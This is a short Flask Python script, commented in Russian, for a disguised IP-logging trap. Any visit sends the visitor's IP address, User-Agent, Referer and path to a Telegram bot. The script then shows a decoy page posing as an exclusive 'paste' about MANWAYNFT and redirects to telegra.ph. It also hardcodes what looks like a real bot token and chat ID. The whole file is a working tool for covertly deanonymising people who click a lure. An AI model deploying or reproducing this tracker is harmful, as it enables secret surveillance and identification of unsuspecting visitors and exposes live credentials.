\from flask import Flask, request
import requests
import os

app = Flask(__name__)

# === НАСТРОЙКИ TELEGRAM ===
TELEGRAM_BOT_TOKEN = "8510586084:AAG3U6iN3oAbkk9sTNZFhVBMSM93CsgZCTQ"      # ← ЗАМЕНИ НА СВОЙ ТОКЕН
TELEGRAM_CHAT_ID = "8578164795"                      # ← ЗАМЕНИ НА СВОЙ CHAT ID

def send_to_telegram(ip, user_agent, referer, path):
    message = (
        f"🚨 *Новый переход по пасте!*\n\n"
        f"🌐 IP: `{ip}`\n"
        f"📱 User-Agent: `{user_agent}`\n"
        f"↩️ Referer: `{referer}`\n"
        f"🔗 Path: `/{path}`"
    )
    url = f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "disable_web_page_preview": True
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"[!] Ошибка отправки в Telegram: {e}")

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def track_and_redirect(path):
    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Direct')

    # Отправляем данные в Telegram
    send_to_telegram(real_ip, user_agent, referer, path)

    target_url = f"https://telegra.ph/ {path}" if path else "https://telegra.ph "
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>ПАСТА НА MANWAYNFT by kemerovo</title>
        <meta name="description" content="Эксклюзивная паста от kemerovo. Только для избранных.">
        <meta property="og:title" content="ПАСТА НА MANWAYNFT by kemerovo" />
        <meta property="og:description" content="Эксклюзивная паста от kemerovo. Только для избранных." />
        <meta property="og:image" content="https://i.imgur.com/5KbQq9L.png " />
        <meta http-equiv="refresh" content="1;url={target_url}">
        <style>
            body {{
                display: flex; justify-content: center; align-items: center;
                height: 100vh; margin: 0; background: #000; color: #0f0;
                font-family: monospace; font-size: 24px; text-align: center;
            }}
        </style>
    </head>
    <body>
        ПАСТА НА MANWAYNFT by kemerovo<br>
        <span style="font-size:14px; color:#0a0;">Загрузка...</span>
    </body>
    </html>
    '''
